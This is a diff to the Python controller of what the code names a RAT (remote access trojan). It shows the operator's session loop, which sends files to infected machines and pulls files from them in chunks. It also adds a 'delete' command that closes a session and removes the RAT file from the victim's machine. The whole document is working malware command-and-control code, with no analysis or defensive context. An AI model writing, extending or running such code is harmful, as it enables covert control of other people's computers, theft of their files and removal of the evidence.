@@ -60,7 +60,7 @@ def start_management(client_info):
                 os.system('cls' if os.name == 'nt' else 'clear')
                 chan.send(b'keep_alive')
                 continue
-            if command != 'exit':
+            if command != 'exit' and command != 'delete':
                 if command.startswith('upload'):
                     file_name = command[7:].strip().strip("'\"")
                     file_path = Path(CWD / file_name).resolve()
@@ -82,6 +82,8 @@ def start_management(client_info):
                         len_bytes += chan.recv(1)
                     data_size = int(len_bytes.decode('utf-8').strip())
 
+                    print(f'Uploading {file_name} ({data_size} bytes)...')
+
                     result = b''
                     while len(result) < data_size:
                         chunk = chan.recv(data_size - len(result))
@@ -100,27 +102,51 @@ def start_management(client_info):
                 except ValueError:
                     data_size = 0
                 if data_size > 0:
-                    result = b''
-                    while len(result) < data_size:
-                        chunk = chan.recv(data_size - len(result))
-                        if not chunk:
-                            break
-                        result += chunk
-                    
                     if command.startswith('download'):
                         file_name = command[9:].strip().strip("'\"")
-                        if result.startswith(b'Error:'):
-                            print(result.decode('utf-8', errors='ignore'), end='')
+                        save_path = Path(CWD / file_name)
+
+                        if data_size < 1000:
+                            result = b''
+                            while len(result) < data_size:
+                                chunk = chan.recv(data_size - len(result))
+                                if not chunk:
+                                    break
+                                result += chunk
+
+                            if result.startswith(b'Error:'):
+                                print(result.decode('utf-8', errors='ignore'), end='')
+                            else:
+                                with open(save_path, 'wb') as file:
+                                    file.write(result)
+                                print(f'[+] File {file_name} downloaded successfully.\n')
                         else:
-                            save_path = Path(CWD / file_name)
+                            print(f'Downloading {file_name} ({data_size} bytes)...')
+                            bytes_received = 0
                             with open(save_path, 'wb') as file:
-                                file.write(result)
+                                while bytes_received < data_size:
+                                    to_read = min(32768, data_size - bytes_received)
+                                    chunk = chan.recv(to_read)
+                                    if not chunk:
+                                        break
+                                    file.write(chunk)
+                                    bytes_received += len(chunk)
                             print(f'[+] File {file_name} downloaded successfully.\n')
                     else:
+                        result = b''
+                        while len(result) < data_size:
+                            chunk = chan.recv(data_size - len(result))
+                            if not chunk:
+                                break
+                            result += chunk
                         print(result.decode('utf-8', errors='ignore'), end='')
             else:
-                chan.send('exit'.encode('utf-8'))
-                print(f'[+] Session with ID {c_id} completely closed.')
+                if command == 'exit':
+                    chan.send('exit'.encode('utf-8'))
+                    print(f'[+] Session with ID {c_id} completely closed.')
+                elif command == 'delete':
+                    chan.send('delete'.encode('utf-8'))
+                    print(f'[+] Session with ID {c_id} completely closed and RAT file deleted.')
                 with clients_lock:
                     if c_id in active_clients: del active_clients[c_id]
                 chan.close()
